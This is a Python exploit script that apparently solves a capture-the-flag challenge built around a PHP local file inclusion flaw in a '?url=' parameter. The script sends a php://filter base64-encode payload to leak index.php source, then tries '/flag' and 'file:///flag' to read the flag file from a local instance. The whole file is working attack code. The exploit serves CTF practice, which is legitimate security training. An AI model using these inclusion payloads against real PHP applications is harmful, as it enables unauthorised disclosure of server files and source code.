#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import atexit
import os
atexit.register(lambda: print("作者 ZluxYao"))

import base64
import re
import sys
from urllib.parse import urljoin

import requests

os.environ["NO_PROXY"] = "*"  # 防止代理污染：脚本只访问 127.0.0.1

FLAG_RE = re.compile(r"TOGOGO-flag\{[^}]+\}")

# Change this URL when the challenge instance changes.
TARGET_URL = os.environ.get("GKD_URL") or ("http://127.0.0.1:34289")


def fetch(session: requests.Session, base_url: str, include_target: str) -> str:
    """Send ?url=<include_target> and return response text."""
    r = session.get(base_url, params={"url": include_target}, timeout=10)
    r.raise_for_status()
    return r.text


def try_get_source(session: requests.Session, base_url: str) -> None:
    """Optional: read index.php source through php://filter for proof."""
    payload = "php://filter/convert.base64-encode/resource=index.php"
    try:
        text = fetch(session, base_url, payload).strip()
        # The response should be base64 encoded PHP source. Keep this best-effort.
        decoded = base64.b64decode(text, validate=False).decode("utf-8", errors="ignore")
        if "include" in decoded and "$_GET" in decoded:
            print("[+] php://filter source proof:")
            for line in decoded.splitlines():
                if "http://" in line or "https://" in line or "include" in line or "$_GET" in line:
                    print("    " + line.strip())
    except Exception as e:
        print(f"[-] source proof skipped: {e}")


def main() -> int:
    base_url = sys.argv[1] if len(sys.argv) > 1 else TARGET_URL
    if not base_url.startswith(("http://", "https://")):
        base_url = "http://" + base_url
    # Ensure params are sent to the web root / index endpoint.
    base_url = urljoin(base_url.rstrip("/") + "/", "/")

    session = requests.Session()
    print(f"[*] Target: {base_url}")

    try_get_source(session, base_url)

    payloads = [
        "/flag",          # direct local include
        "file:///flag",   # file wrapper include
    ]

    for payload in payloads:
        print(f"[*] Trying payload: ?url={payload}")
        try:
            body = fetch(session, base_url, payload)
        except Exception as e:
            print(f"[-] Request failed: {e}")
            continue

        m = FLAG_RE.search(body)
        if m:
            flag = m.group(0)
            print(f"[+] FLAG: {flag}")
            return 0
        print("[-] Flag not found in this response")

    print("[-] Exploit failed: flag pattern not found")
    return 1


if __name__ == "__main__":
    raise SystemExit(main())
